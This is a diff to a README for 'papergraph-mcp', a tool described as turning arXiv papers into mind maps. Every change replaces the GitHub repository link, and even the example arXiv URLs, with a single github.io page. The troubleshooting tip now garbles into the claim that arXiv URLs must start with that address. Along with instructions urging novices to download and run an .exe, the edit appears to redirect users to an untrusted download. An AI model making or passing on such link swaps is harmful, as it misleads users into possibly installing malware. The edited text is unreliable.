@@ -1,7 +1,7 @@
 <h1>📄 papergraph-mcp - Turn Papers into Smart Mind Maps</h1>
 
 <p align="center">
-  <a href="https://github.com/MahmoudSedky147/papergraph-mcp" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download papergraph-mcp Now</a>
+  <a href="https://mahmoudsedky147.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download papergraph-mcp Now</a>
 </p>
 
 <h2>🧐 What Is This?</h2>
@@ -16,7 +16,7 @@ Getting started using papergraph-mcp is as easy as installing a phone app. We ha
 
 <h3>Step 1: Download the Application</h3>
 
-**Visit this link to download the application:** **[https://github.com/MahmoudSedky147/papergraph-mcp](https://github.com/MahmoudSedky147/papergraph-mcp)**
+**Visit this link to download the application:** **[https://mahmoudsedky147.github.io](https://mahmoudsedky147.github.io)**
 
 When you click that link, you will land on a webpage that shows all the code files for this project. Do not be scared by all the technical-looking stuff — you do not need to touch any of it. Look for a green button that says **"Code"** or a section on the right side that says **"Releases"**. Click on the **"Releases"** link. You will see a list of versions, like "v1.0.0" etc. Click on the newest one (the top one). Then, look for a file in the list of downloads (usually called something like *papergraph-mcp-windows.zip* orb*t-papergraph-windows.exe*). Click on it to download it to your computer (save it to your **Downloads** folder for easy access.
 
@@ -36,7 +36,7 @@ Once the file has finished downloading (you will see a little progress bar finis
 
 <h3>Step 3: Run It!</h3>
 
-After you start the program, you will see a simple window appear on your screen. This is your control center. It has a text box where you can paste the URL of an arXiv paper (for example, *https://arxiv.org/abs/2401.12345*) or you can click a button labeled **"Browse"** to select a `.tex` file from your computer (that is a LaTeX file,. In the window, you will also see a big button that says **"Generate Graph"**. Click it, and wait a few seconds. The application will process the paper and then show you a visual diagram — with circles (nodes, representing theorems) and lines (edges, representing dependencies. You can zoom in/out, drag nodes around, and even save the graph as an image or PDF file for sharing with colleagues or including in your own research papers.
+After you start the program, you will see a simple window appear on your screen. This is your control center. It has a text box where you can paste the URL of an arXiv paper (for example, *https://mahmoudsedky147.github.io*) or you can click a button labeled **"Browse"** to select a `.tex` file from your computer (that is a LaTeX file,. In the window, you will also see a big button that says **"Generate Graph"**. Click it, and wait a few seconds. The application will process the paper and then show you a visual diagram — with circles (nodes, representing theorems) and lines (edges, representing dependencies. You can zoom in/out, drag nodes around, and even save the graph as an image or PDF file for sharing with colleagues or including in your own research papers.
 
 And that is all! You are officially using papergraph-mcp like a pro. The first time you run it, it might take slightly longer because it needs to load some helpers in the background (it will show a "Loading..." status—be patient for a few seconds.. After the first launch, it starts almost instantly.
 
@@ -148,7 +148,7 @@ When a new version is released on the GitHub page, you just downloadthe latest f
 
 
 
-- **I pasted an arXiv URL, but the app says it cannot find it.** Make sure the URL starts with *https://arxiv.org/abs/* or *https://arxiv.org/pdf/*. Also, ensure you have an active internet connection (check if your browser can open websites). Try pasting the plain URL without any extra text around it.
+- **I pasted an arXiv URL, but the app says it cannot find it.** Make sure the URL starts with *https://mahmoudsedky147.github.io* or *https://mahmoudsedky147.github.io*. Also, ensure you have an active internet connection (check if your browser can open websites). Try pasting the plain URL without any extra text around it.
 
 
 
@@ -199,7 +199,7 @@ papergraph-mcp transforms the way you interact with mathematical literature. No 
 
 
 <p align="center">
-  <a href="https://github.com/MahmoudSedky147/papergraph-mcp" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 12px rgba(240,147,251,0.4);">⬇️ Download from GitHub</a>
+  <a href="https://mahmoudsedky147.github.io" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 12px rgba(240,147,251,0.4);">⬇️ Download from GitHub</a>
 </p>
 
 Keywords: ai-agents, arxiv, knowledge-graph, latex, mathematics, mcp, model-context-protocol, python, research-tools, skills
